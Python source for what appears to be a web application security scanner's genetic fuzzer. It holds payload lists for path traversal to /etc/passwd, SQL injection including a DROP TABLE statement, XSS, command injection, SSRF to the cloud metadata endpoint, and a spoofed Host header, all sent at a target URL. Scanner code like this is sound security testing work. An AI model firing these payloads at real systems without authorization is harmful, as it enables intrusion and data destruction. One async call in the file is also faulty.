class RequestTemplateFuzzer:
    """
    Specialized fuzzer for HTTP request templates with structure-aware mutations.
    Uses genetic algorithms to evolve request templates and integrates schema inference.
    """
    
    def __init__(self, base_url, session_manager, config=None):
        self.base_url = base_url
        self.session_manager = session_manager
        self.config = config or {}
        
        # Initialize Schema Inference Engine and Dynamic Mutation Server
        self.schema_engine = SchemaInferenceEngine(session_manager, config)
        self.mutation_server = DynamicMutationServer(self.schema_engine, config)
        
        # Schema-aware fuzzing configuration
        self.schema_inference_enabled = config.get('schema_inference', {}).get('enabled', True)
        self.dynamic_mutation_enabled = config.get('dynamic_mutation', {}).get('enabled', True)
        
        # Request template structure
        self.templates = []
        self.population = []
        
        # Genetic parameters
        self.mutation_rate = config.get('mutation_rate', 0.15)
        self.crossover_rate = config.get('crossover_rate', 0.25)
        self.population_size = config.get('population_size', 30)
        self.max_generations = config.get('max_generations', 50)
        
        # Component generators
        self.url_generators = [
            self._generate_path_traversal,
            self._generate_sql_injection,
            self._generate_xss,
            self._generate_command_injection,
            self._generate_ssrf,
            self._generate_normal_path
        ]
        
        self.header_generators = [
            self._generate_auth_headers,
            self._generate_content_type_headers,
            self._generate_user_agent_headers,
            self._generate_malicious_headers
        ]
        
        self.body_generators = [
            self._generate_json_body,
            self._generate_form_body,
            self._generate_xml_body,
            self._generate_multipart_body
        ]
    
    def _generate_path_traversal(self):
        """Generate path traversal payloads"""
        payloads = [
            '../../../../etc/passwd',
            '..\\..\\..\\..\\windows\\win.ini',
            '....//....//etc/passwd',
            '..;/..;/etc/passwd',
            '%2e%2e%2fetc%2fpasswd'
        ]
        return random.choice(payloads)
    
    def _generate_sql_injection(self):
        """Generate SQL injection payloads"""
        payloads = [
            "' OR '1'='1",
            "1' AND 1=1--",
            "' UNION SELECT NULL--",
            "'; DROP TABLE users--",
            "' OR 1=1#",
            "admin'--"
        ]
        return random.choice(payloads)
    
    def _generate_xss(self):
        """Generate XSS payloads"""
        payloads = [
            '<script>alert(1)</script>',
            '"><img src=x onerror=alert(1)>',
            '<svg/onload=alert(1)>',
            'javascript:alert(1)',
            '<body onload=alert(1)>'
        ]
        return random.choice(payloads)
    
    def _generate_command_injection(self):
        """Generate command injection payloads"""
        payloads = [
            ';id',
            '|whoami',
            '&&ls',
            ';cat /etc/passwd',
            '`id`',
            '$(id)'
        ]
        return random.choice(payloads)
    
    def _generate_ssrf(self):
        """Generate SSRF payloads"""
        payloads = [
            'http://169.254.169.254/latest/meta-data/',
            'http://127.0.0.1:22',
            'gopher://127.0.0.1:6379/_INFO',
            'http://localhost:8080'
        ]
        return random.choice(payloads)
    
    def _generate_normal_path(self):
        """Generate normal looking paths"""
        paths = [
            '/api/users',
            '/admin/login',
            '/dashboard',
            '/search',
            '/products',
            '/auth/session'
        ]
        return random.choice(paths)
    
    def _generate_auth_headers(self):
        """Generate authentication headers"""
        headers = {}
        auth_type = random.choice(['basic', 'bearer', 'api_key'])
        
        if auth_type == 'basic':
            credentials = base64.b64encode(b'admin:password').decode()
            headers['Authorization'] = f'Basic {credentials}'
        elif auth_type == 'bearer':
            token = secrets.token_hex(32)
            headers['Authorization'] = f'Bearer {token}'
        elif auth_type == 'api_key':
            headers['X-API-Key'] = secrets.token_hex(16)
        
        return headers
    
    def _generate_content_type_headers(self):
        """Generate content-type headers"""
        content_types = [
            'application/json',
            'application/x-www-form-urlencoded',
            'text/xml',
            'multipart/form-data',
            'application/graphql'
        ]
        return {'Content-Type': random.choice(content_types)}
    
    def _generate_user_agent_headers(self):
        """Generate user-agent headers"""
        user_agents = [
            'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
            'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15.0_7) AppleWebKit/537.36',
            'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36',
            'curl/7.68.0',
            'python-requests/2.28.0'
        ]
        return {'User-Agent': random.choice(user_agents)}
    
    def _generate_malicious_headers(self):
        """Generate potentially malicious headers"""
        headers = {}
        attack_type = random.choice(['xss', 'sqli', 'host_injection'])
        
        if attack_type == 'xss':
            headers['X-Forwarded-For'] = '<script>alert(1)</script>'
        elif attack_type == 'sqli':
            headers['Referer'] = "' OR '1'='1"
        elif attack_type == 'host_injection':
            headers['Host'] = 'evil.com'
        
        return headers
    
    def _generate_json_body(self):
        """Generate JSON request body"""
        body = {
            'username': random.choice(['admin', 'user', 'test']),
            'password': random.choice(['password', '123456', 'admin']),
            'email': f'user{random.randint(1, 100)}@example.com'
        }
        
        # Add potential injection points
        if random.random() < 0.3:
            body['username'] = self._generate_sql_injection()
        elif random.random() < 0.3:
            body['username'] = self._generate_xss()
        
        return json.dumps(body)
    
    def _generate_form_body(self):
        """Generate form-encoded body"""
        body = {
            'username': random.choice(['admin', 'user', 'test']),
            'password': random.choice(['password', '123456', 'admin']),
            'csrf_token': secrets.token_hex(16)
        }
        return urlencode(body)
    
    def _generate_xml_body(self):
        """Generate XML request body"""
        xml = f"""<?xml version="1.0"?>
<user>
    <username>{random.choice(['admin', 'user', 'test'])}</username>
    <password>{random.choice(['password', '123456'])}</password>
</user>"""
        return xml
    
    async def run_schema_aware_fuzzing(self, url, method='POST', headers=None, base_data=None):
        """
        Run schema-aware fuzzing using the Schema Inference Engine and Dynamic Mutation Server.
        This replaces blind fuzzing with intelligent, schema-based mutations.
        """
        if not self.schema_inference_enabled or not self.dynamic_mutation_enabled:
            logging.info("Schema-aware fuzzing disabled, falling back to traditional fuzzing")
            return await self.run_genetic_fuzzing(asyncio.get_event_loop())
        
        logging.info(f"Starting schema-aware fuzzing for {url}")
        
        # Step 1: Infer the schema
        schema = await self.schema_engine.infer_endpoint_schema(url, method, headers, base_data)
        logging.info(f"Schema inference complete. Confidence: {schema['confidence']:.2f}")
        logging.info(f"Inferred parameters: {list(schema['parameters'].keys())}")
        
        # Step 2: Generate schema-aware mutations
        mutations = await self.mutation_server.generate_mutations(url, method, headers, base_data)
        logging.info(f"Generated {len(mutations)} schema-aware mutations")
        
        # Step 3: Test each mutation
        results = []
        for mutation in mutations:
            try:
                # Build request data from mutation
                test_data = {mutation['parameter']: mutation['value']}
                
                # Send the mutation
                response = await self._send_mutation_request(url, method, test_data, headers)
                
                # Analyze response
                if response:
                    result = {
                        'mutation': mutation,
                        'response': response,
                        'interesting': self._is_interesting_response(response, mutation),
                        'vulnerability_detected': self._detect_vulnerability(response, mutation)
                    }
                    results.append(result)
                    
                    if result['vulnerability_detected']:
                        logging.warning(f"Potential vulnerability detected: {mutation['mutation_type']}")
                        
            except Exception as e:
                logging.debug(f"Mutation test failed: {e}")
        
        # Step 4: Generate summary
        summary = {
            'total_mutations': len(mutations),
            'interesting_responses': len([r for r in results if r['interesting']]),
            'vulnerabilities_found': len([r for r in results if r['vulnerability_detected']]),
            'schema_confidence': schema['confidence'],
            'results': results
        }
        
        logging.info(f"Schema-aware fuzzing complete. Vulnerabilities found: {summary['vulnerabilities_found']}")
        return summary
    
    async def _send_mutation_request(self, url, method, data, headers):
        """Send a mutation request and return response data"""
        try:
            async with self.session_manager.async_session.request(
                method,
                url,
                json=data,
                headers=headers,
                timeout=ClientTimeout(total=10)
            ) as response:
                text = await response.text()
                return {
                    'status': response.status,
                    'response_length': len(text),
                    'response_text': text,
                    'headers': dict(response.headers)
                }
        except Exception as e:
            logging.debug(f"Mutation request failed: {e}")
            return None
    
    def _is_interesting_response(self, response, mutation):
        """Determine if a response is interesting based on status and content"""
        if not response:
            return False
        
        status = response.get('status', 0)
        response_text = response.get('response_text', '')
        
        # Error responses are interesting
        if status >= 400:
            return True
        
        # Check for reflected payload
        mutation_value = str(mutation.get('value', ''))
        if mutation_value and mutation_value in response_text:
            return True
        
        # Check for error patterns in response
        error_patterns = ['error', 'exception', 'fatal', 'warning', 'traceback']
        if any(pattern in response_text.lower() for pattern in error_patterns):
            return True
        
        return False
    
    def _detect_vulnerability(self, response, mutation):
        """Detect if a mutation indicates a vulnerability"""
        if not response:
            return False
        
        status = response.get('status', 0)
        response_text = response.get('response_text', '')
        mutation_type = mutation.get('mutation_type', '')
        
        # Overflow vulnerabilities
        if 'overflow' in mutation_type and status >= 500:
            return True
        
        # Injection vulnerabilities
        if 'injection' in mutation_type:
            mutation_value = str(mutation.get('value', ''))
            if mutation_value in response_text:
                return True
        
        # Deserialization vulnerabilities
        if 'deserialization' in mutation_type or 'pollution' in mutation_type:
            if status >= 500 or 'polluted' in response_text.lower():
                return True
        
        # Format string vulnerabilities
        if 'format' in mutation_type and status >= 500:
            return True
        
        return False
    
    def _generate_multipart_body(self):
        """Generate multipart form data using aiohttp.FormData for file upload fuzzing"""
        form_data = FormData()
        
        # Add regular form fields with potential injection payloads
        username_options = ['admin', 'user', 'test', self._generate_sql_injection(), self._generate_xss()]
        password_options = ['password', '123456', 'admin', self._generate_command_injection()]
        
        form_data.add_field('username', random.choice(username_options))
        form_data.add_field('password', random.choice(password_options))
        form_data.add_field('csrf_token', secrets.token_hex(16))
        
        # Add file upload with payload injection
        # This is the key feature for multipart/form-data fuzzing
        file_payloads = [
            ('test.txt', b'This is a test file content'),
            ('upload.php', b'<?php echo "test"; ?>'),
            ('exploit.jpg', b'\xff\xd8\xff\xe0' + b'<script>alert(1)</script>'),  # Fake image with XSS
            ('config.ini', b'[database]\npassword=admin'),
            ('data.json', b'{"user":"admin","role":"administrator"}')
        ]
        
        # Randomly choose to add a file upload
        if random.random() < 0.7:  # 70% chance to include file upload
            filename, file_content = random.choice(file_payloads)
            
            # Add payload injection to file content
            if random.random() < 0.5:
                file_content = file_content + str.encode(f" {self._generate_xss()}")
            
            form_data.add_field(
                'file',
                file_content,
                filename=filename,
                content_type='application/octet-stream'
            )
        
        # Add additional file upload with different content type for fuzzing
        if random.random() < 0.3:  # 30% chance for second file
            form_data.add_field(
                'avatar',
                b'fake image data',
                filename='avatar.jpg',
                content_type='image/jpeg'
            )
        
        return form_data
    
    def create_template(self):
        """Create a random request template"""
        template = {
            'method': random.choice(['GET', 'POST', 'PUT', 'DELETE', 'PATCH']),
            'path': random.choice(self.url_generators)(),
            'headers': {},
            'body': None,
            'params': {}
        }
        
        # Add headers
        for _ in range(random.randint(1, 3)):
            template['headers'].update(random.choice(self.header_generators)())
        
        # Add body for POST/PUT/PATCH
        if template['method'] in ['POST', 'PUT', 'PATCH']:
            body = random.choice(self.body_generators)()
            template['body'] = body
            
            # If FormData is used, aiohttp will automatically set Content-Type with boundary
            # We need to handle this specially in the request sending logic
            if hasattr(body, '__class__') and body.__class__.__name__ == 'FormData':
                template['is_multipart'] = True
            else:
                template['is_multipart'] = False
        
        # Add query parameters
        if random.random() < 0.5:
            template['params'] = {
                'id': random.randint(1, 1000),
                'search': random.choice(['test', 'admin', 'user'])
            }
        
        return template
    
    def mutate_template(self, template):
        """Mutate a request template"""
        mutated = template.copy()
        mutated['headers'] = template['headers'].copy()
        mutated['params'] = template['params'].copy()
        
        mutation_type = random.choice([
            'method', 'path', 'header', 'body', 'param', 'add_header', 'remove_header'
        ])
        
        if mutation_type == 'method':
            mutated['method'] = random.choice(['GET', 'POST', 'PUT', 'DELETE', 'PATCH'])
        elif mutation_type == 'path':
            mutated['path'] = random.choice(self.url_generators)()
        elif mutation_type == 'header':
            if mutated['headers']:
                header_name = random.choice(list(mutated['headers'].keys()))
                mutated['headers'][header_name] = random.choice(self.header_generators)().get(
                    header_name, 'mutated'
                )
        elif mutation_type == 'body':
            if mutated['body']:
                mutated['body'] = random.choice(self.body_generators)()
        elif mutation_type == 'param':
            if mutated['params']:
                param_name = random.choice(list(mutated['params'].keys()))
                mutated['params'][param_name] = random.choice([
                    self._generate_sql_injection(),
                    self._generate_xss(),
                    random.randint(1, 1000)
                ])
        elif mutation_type == 'add_header':
            mutated['headers'].update(random.choice(self.header_generators)())
        elif mutation_type == 'remove_header':
            if mutated['headers']:
                header_name = random.choice(list(mutated['headers'].keys()))
                del mutated['headers'][header_name]
        
        return mutated
    
    def crossover_templates(self, parent1, parent2):
        """Crossover two request templates"""
        child = {
            'method': parent1['method'] if random.random() < 0.5 else parent2['method'],
            'path': parent1['path'] if random.random() < 0.5 else parent2['path'],
            'headers': {},
            'body': parent1['body'] if random.random() < 0.5 else parent2['body'],
            'params': {}
        }
        
        # Crossover headers
        all_headers = set(parent1['headers'].keys()) | set(parent2['headers'].keys())
        for header in all_headers:
            if header in parent1['headers'] and header in parent2['headers']:
                child['headers'][header] = parent1['headers'][header] if random.random() < 0.5 else parent2['headers'][header]
            elif header in parent1['headers']:
                child['headers'][header] = parent1['headers'][header]
            else:
                child['headers'][header] = parent2['headers'][header]
        
        # Crossover params
        all_params = set(parent1['params'].keys()) | set(parent2['params'].keys())
        for param in all_params:
            if param in parent1['params'] and param in parent2['params']:
                child['params'][param] = parent1['params'][param] if random.random() < 0.5 else parent2['params'][param]
            elif param in parent1['params']:
                child['params'][param] = parent1['params'][param]
            else:
                child['params'][param] = parent2['params'][param]
        
        return child
    
    def evaluate_template(self, template, loop):
        """Evaluate a request template"""
        async def send_request():
            url = urljoin(self.base_url, template['path'])
            
            # Prepare parameters
            params = template.get('params', {})
            if params:
                url = f"{url}?{urlencode(params)}"
            
            # Prepare body
            data = template.get('body')
            json_data = None
            
            # Handle multipart/form-data with FormData
            if template.get('is_multipart', False):
                # FormData will be passed directly to aiohttp
                # Don't set Content-Type header manually - aiohttp will set it with boundary
                headers = {k: v for k, v in template['headers'].items() 
                          if k.lower() != 'content-type'}
            else:
                headers = template['headers']
                if template['headers'].get('Content-Type', '').startswith('application/json'):
                    try:
                        json_data = json.loads(data) if data else None
                        data = None
                    except (json.JSONDecodeError, Exception) as e:
                        logging.exception(f"JSON parsing error in template: {e}")
            
            try:
                async with self.session_manager.async_session.request(
                    template['method'],
                    url,
                    headers=headers,
                    data=data,
                    json=json_data,
                    timeout=ClientTimeout(total=10)
                ) as response:
                    text = await response.text()
                    
                    return {
                        'status': response.status,
                        'response_length': len(text),
                        'response_hash': hash(text),
                        'headers': dict(response.headers),
                        'is_error': response.status >= 400,
                        'is_interesting': response.status not in [200, 201, 204, 301, 302, 304]
                    }
            except Exception as e:
                return {
                    'status': 0,
                    'error': str(e),
                    'is_error': True,
                    'is_interesting': True
                }
        
        return loop.run_until_complete(send_request())
    
    def run_genetic_fuzzing(self, loop, generations=None):
        """Run genetic fuzzing on request templates"""
        if generations is None:
            generations = self.max_generations
        
        # Initialize population
        self.population = [self.create_template() for _ in range(self.population_size)]
        
        results = []
        
        for generation in range(generations):
            logging.info(f"Request Template Fuzzer - Generation {generation + 1}/{generations}")
            
            # Evaluate population
            evaluated = []
            for template in self.population:
                evaluation = self.evaluate_template(template, loop)
                template['fitness'] = self._calculate_fitness(evaluation)
                template['evaluation'] = evaluation
                evaluated.append(template)
                
                if evaluation['is_interesting']:
                    results.append({
                        'generation': generation,
                        'template': template,
                        'evaluation': evaluation
                    })
            
            # Sort by fitness
            evaluated.sort(key=lambda x: x['fitness'], reverse=True)
            self.population = evaluated
            
            # Create new generation
            new_population = []
            
            # Elitism
            elite_count = max(1, self.population_size // 10)
            new_population.extend(self.population[:elite_count])
            
            # Generate offspring
            while len(new_population) < self.population_size:
                parent1 = self._tournament_selection()
                parent2 = self._tournament_selection()
                
                if random.random() < self.crossover_rate:
                    child = self.crossover_templates(parent1, parent2)
                else:
                    child = parent1.copy()
                
                if random.random() < self.mutation_rate:
                    child = self.mutate_template(child)
                
                new_population.append(child)
            
            self.population = new_population
        
        return {
            'generations': generations,
            'interesting_findings': results,
            'final_population': self.population
        }
    
    def _calculate_fitness(self, evaluation):
        """Calculate fitness for template evaluation"""
        fitness = 0
        
        if evaluation.get('is_interesting', False):
            fitness += 10
        
        if evaluation.get('is_error', False):
            fitness += 5
        
        if evaluation.get('status', 0) >= 500:
            fitness += 20
        
        # Response uniqueness bonus
        fitness += min(evaluation.get('response_length', 0) / 1000, 5)
        
        return fitness
    
    def _tournament_selection(self, tournament_size=3):
        """Tournament selection"""
        tournament = random.sample(self.population, min(tournament_size, len(self.population)))
        return max(tournament, key=lambda x: x['fitness'])


# Integrate with OmegaDAST class
def integrate_mutation_fuzzing(target_url, session_manager, wordlist=None, max_requests=1000):
    """Integrate simple mutation fuzzing methods into an OmegaDAST class"""
    # Initialize simple mutation fuzzer
    mutation_fuzzer = SimpleMutationFuzzer(
        target_url=target_url,
        session_manager=session_manager,
        wordlist=wordlist,
        max_requests=max_requests
    )

    # Run mutation fuzzer
    loop = asyncio.get_event_loop()
    results = loop.run_until_complete(mutation_fuzzer.run())

    return results

